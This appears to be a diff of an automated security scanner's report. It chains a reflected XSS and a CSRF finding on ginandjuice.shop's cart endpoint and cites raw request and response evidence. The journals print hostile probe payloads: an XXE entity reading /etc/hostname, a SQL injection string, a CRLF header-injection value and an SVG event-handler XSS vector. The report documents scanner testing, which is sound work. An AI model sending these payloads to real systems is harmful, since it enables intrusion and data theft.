     twin row: {"carried_by_params": 3, "consumed_by_steps": [], "entity": "Order", "minted_by_steps": [], "surfaces": ["POST /catalog/
@@ -1857,34 +1663,34 @@ findings: F-fc86abef99, F-d8bbff4e3e | chain_rule: CHAIN-XSS-CSRF | mitigations 
 
   the state-changing operation accepts tokenless cross-origin requests (hostile-origin replay accepted with the scan's own session; no anti-CSRF token, no origin validation)
 
-  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
+  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-orig`
     finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
-      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
+      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-origin replay -> HTTP 200 (11424B)
       verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
 
 **[STATE] — verified**
 
   the forged state-changing operation was accepted and processed (hostile-origin replay returned the same success as the baseline)
 
-  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
+  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-orig`
     finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
-      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
+      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-origin replay -> HTTP 200 (11424B)
       verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
-  - `journal` ref `req-0064df16` excerpt: `"Missing parameter 'productId'"`
+  - `journal` ref `req-026d38e9` excerpt: `"Invalid parameter: productId"`
     REQUEST  POST https://ginandjuice.shop/catalog/cart
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
-      Content-Type: application/xml
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
+      Content-Type: application/x-www-form-urlencoded
       Cookie: AWSALB=[REDACTED]
-      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///etc/hostname">]><stockCheck><productId>4</productId><redir>PROD...
+      body: productId=1%27+OR+%271%27%3D%271%27+--+&redir=PRODUCT&quantity=1
     RESPONSE 400
-      date: Sat, 03 Oct 2026 22:26:30 GMT
+      date: Sun, 04 Oct 2026 11:34:02 GMT
       content-type: application/json; charset=utf-8
-      content-length: 31
+      content-length: 30
       connection: keep-alive
       set-cookie: AWSALBCORS=[REDACTED]
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
-      body[0:200]: "Missing parameter 'productId'"
+      body[0:200]: "Invalid parameter: productId"
 
 **[IMPACT] — verified**
 
@@ -1894,9 +1700,9 @@ findings: F-fc86abef99, F-d8bbff4e3e | chain_rule: CHAIN-XSS-CSRF | mitigations 
     finding: xss_dom GET https://ginandjuice.shop/blog/ param=search status=verified conf=0.9
       evidence[dom_execution]: source=search sink=document.write — payload executed as markup via attr_inject_onload — window.__SENTINEL_XSS__ set in live DOM; static flow: function
       verification: re-probe:fresh-canary passed=True conf=0.9 rounds=1
-  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
+  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-orig`
     finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
-      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
+      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-origin replay -> HTTP 200 (11424B)
       verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
 
 </details>
@@ -1909,11 +1715,11 @@ findings: F-4df129b258, F-d8bbff4e3e | chain_rule: CHAIN-XSS-CSRF | mitigations 
 
 **HOP 1** [VERIFIED] (finding F-4df129b258) — attacker-delivered script executes in the victim's browser on ginandjuice.shop (xss_reflected: execution proven)
   - evidence: finding `F-4df129b258` — `canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmark`
-  - evidence: journal `req-00eb0dfb` — `https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed`
+  - evidence: journal `req-007fe5b2` — `https://ginandjuice.shop/catalog?category=%3Csvg%3E%3Canimate+onbegin%3Dsentinel42%28%29+attributeName%3Dx%3E`
 
 **HOP 2** [VERIFIED] (finding F-d8bbff4e3e) — the executing code drives the state-changing operation POST https://ginandjuice.shop/catalog/cart — which accepts tokenless cross-origin requests
-  - evidence: finding `F-d8bbff4e3e` — `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), `
-  - evidence: journal `req-0064df16` — `https://ginandjuice.shop/catalog/cart`
+  - evidence: finding `F-d8bbff4e3e` — `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), `
+  - evidence: journal `req-026d38e9` — `https://ginandjuice.shop/catalog/cart`
 
 | Link | Status | Statement |
 |---|---|---|
@@ -1935,12 +1741,11 @@ findings: F-4df129b258, F-d8bbff4e3e | chain_rule: CHAIN-XSS-CSRF | mitigations 
   - `finding` ref `F-4df129b258` excerpt: `canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42"; `
     finding: xss_reflected GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
       evidence[unescaped_reflection]: canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
-      evidence[unescaped_reflection]: canary reflected raw in context: …ategory=Juice&searchTerm=1"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
       evidence[ng_expression_reflection]: Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: …             <input hidden type
       verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6
-  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
+  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-orig`
     finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
-      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
+      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-origin replay -> HTTP 200 (11424B)
       verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
 
 **[ENTRY] — verified**
@@ -1950,21 +1755,19 @@ findings: F-4df129b258, F-d8bbff4e3e | chain_rule: CHAIN-XSS-CSRF | mitigations 
   - `finding` ref `F-4df129b258` excerpt: `canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42"; `
     finding: xss_reflected GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
       evidence[unescaped_reflection]: canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
-      evidence[unescaped_reflection]: canary reflected raw in context: …ategory=Juice&searchTerm=1"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
       evidence[ng_expression_reflection]: Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: …             <input hidden type
       verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6
-  - `journal` ref `req-00eb0dfb` excerpt: `https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed`
-    REQUEST  GET https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+  - `journal` ref `req-007fe5b2` excerpt: `https://ginandjuice.shop/catalog?category=%3Csvg%3E%3Canimate+onbegin%3Dsentinel42%28%29+attributeName%3Dx%3E`
+    REQUEST  GET https://ginandjuice.shop/catalog?category=%3Csvg%3E%3Canimate+onbegin%3Dsentinel42%28%29+attributeName%3Dx%3E
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Cookie: AWSALB=[REDACTED]
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:22:46 GMT
+      date: Sun, 04 Oct 2026 11:31:33 GMT
       content-type: text/html; charset=utf-8
-      content-length: 9461
+      content-length: 9479
       connection: keep-alive
-      set-cookie: category=sentinelcrlf2
-      x-sentinel-verify-hdr: confirmed; Secure; HttpOnly
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      set-cookie: category=<svg><animate onbegin=sentinel42() attributeName=x>; Secure; HttpOnly
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
       body[0:200]: <!DOCTYPE html>
 <html>
@@ -1980,21 +1783,19 @@ findings: F-4df129b258, F-d8bbff4e3e | chain_rule: CHAIN-XSS-CSRF | mitigations 
   - `finding` ref `F-4df129b258` excerpt: `canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42"; `
     finding: xss_reflected GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
       evidence[unescaped_reflection]: canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
-      evidence[unescaped_reflection]: canary reflected raw in context: …ategory=Juice&searchTerm=1"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
       evidence[ng_expression_reflection]: Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: …             <input hidden type
       verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6
-  - `journal` ref `req-00eb0dfb` excerpt: `https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed`
-    REQUEST  GET https://ginandjuice.shop/catalog?category=sentinelcrlf2%0D%0AX-Sentinel-Verify-Hdr%3A+confirmed
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
+  - `journal` ref `req-007fe5b2` excerpt: `https://ginandjuice.shop/catalog?category=%3Csvg%3E%3Canimate+onbegin%3Dsentinel42%28%29+attributeName%3Dx%3E`
+    REQUEST  GET https://ginandjuice.shop/catalog?category=%3Csvg%3E%3Canimate+onbegin%3Dsentinel42%28%29+attributeName%3Dx%3E
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
       Cookie: AWSALB=[REDACTED]
     RESPONSE 200
-      date: Sat, 03 Oct 2026 22:22:46 GMT
+      date: Sun, 04 Oct 2026 11:31:33 GMT
       content-type: text/html; charset=utf-8
-      content-length: 9461
+      content-length: 9479
       connection: keep-alive
-      set-cookie: category=sentinelcrlf2
-      x-sentinel-verify-hdr: confirmed; Secure; HttpOnly
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      set-cookie: category=<svg><animate onbegin=sentinel42() attributeName=x>; Secure; HttpOnly
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
       body[0:200]: <!DOCTYPE html>
 <html>
@@ -2002,33 +1803,33 @@ findings: F-4df129b258, F-d8bbff4e3e | chain_rule: CHAIN-XSS-CSRF | mitigations 
     <head>
         <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
         <link href=/resources/css/labsEcommerce.css rel=stylesheet>
-  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
+  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-orig`
     finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
-      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
+      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-origin replay -> HTTP 200 (11424B)
       verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
-  - `journal` ref `req-0064df16` excerpt: `https://ginandjuice.shop/catalog/cart`
+  - `journal` ref `req-026d38e9` excerpt: `https://ginandjuice.shop/catalog/cart`
     REQUEST  POST https://ginandjuice.shop/catalog/cart
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
-      Content-Type: application/xml
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
+      Content-Type: application/x-www-form-urlencoded
       Cookie: AWSALB=[REDACTED]
-      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///etc/hostname">]><stockCheck><productId>4</productId><redir>PROD...
+      body: productId=1%27+OR+%271%27%3D%271%27+--+&redir=PRODUCT&quantity=1
     RESPONSE 400
-      date: Sat, 03 Oct 2026 22:26:30 GMT
+      date: Sun, 04 Oct 2026 11:34:02 GMT
       content-type: application/json; charset=utf-8
-      content-length: 31
+      content-length: 30
       connection: keep-alive
       set-cookie: AWSALBCORS=[REDACTED]
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
-      body[0:200]: "Missing parameter 'productId'"
+      body[0:200]: "Invalid parameter: productId"
 
 **[OBJECT] — verified**
 
   the state-changing operation (twin entity typing: Order)
 
-  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
+  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-orig`
     finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
-      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
+      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-origin replay -> HTTP 200 (11424B)
       verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
   - `twin` ref `stats.digital_twin.entity_inventory` excerpt: `{"carried_by_params": 3, "consumed_by_steps": [], "entity": "Order", "minted_by_steps": [], "surfaces": ["POST /catalog/`
     twin row: {"carried_by_params": 3, "consumed_by_steps": [], "entity": "Order", "minted_by_steps": [], "surfaces": ["POST /catalog/
@@ -2037,34 +1838,34 @@ findings: F-4df129b258, F-d8bbff4e3e | chain_rule: CHAIN-XSS-CSRF | mitigations 
 
   the state-changing operation accepts tokenless cross-origin requests (hostile-origin replay accepted with the scan's own session; no anti-CSRF token, no origin validation)
 
-  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
+  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-orig`
     finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
-      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
+      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-origin replay -> HTTP 200 (11424B)
       verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
 
 **[STATE] — verified**
 
   the forged state-changing operation was accepted and processed (hostile-origin replay returned the same success as the baseline)
 
-  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
+  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-orig`
     finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
-      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
+      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-origin replay -> HTTP 200 (11424B)
       verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
-  - `journal` ref `req-0064df16` excerpt: `"Missing parameter 'productId'"`
+  - `journal` ref `req-026d38e9` excerpt: `"Invalid parameter: productId"`
     REQUEST  POST https://ginandjuice.shop/catalog/cart
-      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.3; +security-scanner)
-      Content-Type: application/xml
+      User-Agent: Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)
+      Content-Type: application/x-www-form-urlencoded
       Cookie: AWSALB=[REDACTED]
-      body: <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY sentinelxxe SYSTEM "file:///etc/hostname">]><stockCheck><productId>4</productId><redir>PROD...
+      body: productId=1%27+OR+%271%27%3D%271%27+--+&redir=PRODUCT&quantity=1
     RESPONSE 400
-      date: Sat, 03 Oct 2026 22:26:30 GMT
+      date: Sun, 04 Oct 2026 11:34:02 GMT
       content-type: application/json; charset=utf-8
-      content-length: 31
+      content-length: 30
       connection: keep-alive
       set-cookie: AWSALBCORS=[REDACTED]
-      x-backend: e0ec818b-8de4-433f-abd4-1d8f56858033
+      x-backend: eef95d2f-58e1-44cf-ba91-c19bb7e4a3ad
       x-frame-options: SAMEORIGIN
-      body[0:200]: "Missing parameter 'productId'"
+      body[0:200]: "Invalid parameter: productId"
 
 **[IMPACT] — verified**
 
@@ -2073,12 +1874,11 @@ findings: F-4df129b258, F-d8bbff4e3e | chain_rule: CHAIN-XSS-CSRF | mitigations 
   - `finding` ref `F-4df129b258` excerpt: `canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42"; `
     finding: xss_reflected GET https://ginandjuice.shop/catalog param=category status=verified conf=0.9
       evidence[unescaped_reflection]: canary reflected raw in context: …":"/catalog?category=Juice"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
-      evidence[unescaped_reflection]: canary reflected raw in context: …ategory=Juice&searchTerm=1"};     const selectedCategory = "<sentinelxssmarkerpro42";     const root = ReactDOM.c… [
       evidence[ng_expression_reflection]: Angular {{expression}} reflected raw inside an ng-app page — evaluated client-side by Angular binding semantics [ctx: …             <input hidden type
       verification: re-test:variant-battery-6 passed=True conf=0.9 rounds=6
-  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-orig`
+  - `finding` ref `F-d8bbff4e3e` excerpt: `state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-orig`
     finding: csrf POST https://ginandjuice.shop/catalog/cart param=productId, redir, quantity status=verified conf=0.85
-      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (12658B), cross-origin replay -> HTTP 200 (12658B)
+      evidence[cross_origin_acceptance]: state-changing POST accepted from hostile origin (https://csrf-probe.example): baseline -> HTTP 200 (11424B), cross-origin replay -> HTTP 200 (11424B)
       verification: re-test:fresh-hostile-origin passed=True conf=0.85 rounds=3
 
 </details>
@@ -3735,6 +3535,26 @@ findings: F-acb5de3e87 | chain_rule: — | mitigations absent: []
 </details>
 
 
+## Freshness confirmation matrix
+
+Zero-request re-confirmation over each file's own journal (scripts/l2_reconfirm_fresh.py): the shipped apath layer rebuilt byte-identically, every journal entry dated inside a single scan window, every citation a literal slice.
+
+| Target | Run | Kind | Journal entries | Window (s) | Rebuild identical | Stale entries | Citations literal | Verdict |
+|---|---|---|---|---|---|---|---|---|
+| testaspnet | run-4fe17c44cc | round-7 targeted fresh live scan | 546 | 489 | YES | 0 | YES | **FRESH-LIVE CONFIRMED** |
+| ginjuice | run-1738d74ba4 | round-7 targeted fresh live scan | 395 | 443 | YES | 0 | YES | **FRESH-LIVE CONFIRMED** |
+| gruyere2 | run-228ffb67c9 | round-6 fresh full live scan | 632 | 829 | YES | 0 | YES | **FRESH-LIVE CONFIRMED** |
+| testasp | run-e2a9fe4450 | round-6 fresh full live scan | 716 | 507 | YES | 0 | YES | **FRESH-LIVE CONFIRMED** |
+
+## Not-fresh-verified register
+
+
+**testaspnet — AP-8876b898b5 (sql_injection at /Comments.aspx, v4.2.3 projection)**
+
+- status: **NOT FRESH-VERIFIED**
+- reason: public-target content drift: the TRUE-condition body collapsed 23962B (v4.2.3, 2026-10-03 22:58Z) -> 14880B (round-7 fresh scan, 2026-10-04 12:04Z) while the FALSE side stayed byte-identical (13310B); the boolean differential fell 10652B/44% -> 1570B/10.5%, below the engine anti-FP threshold max(200B, 25%) — the engine honestly declined to certify; probes WERE sent fresh (journal run-4fe17c44cc req-045e4187 TRUE / req-54e20175 FALSE)
+- evidence: build-v423/results/live_v430/testaspnet.json (journal) + build-v423/results/archive_round6_projections reference run
+
 ## Evidence cross-checks
 
-**ALL CHECKS PASSED** — every journal citation exists in the journal and every excerpt is a literal slice of the cited raw entry (substring-verified evidence).
+**ALL CHECKS PASSED** — every journal citation exists in that run's journal and every excerpt is a literal slice of the cited raw entry (substring-verified evidence against the FRESH journals).
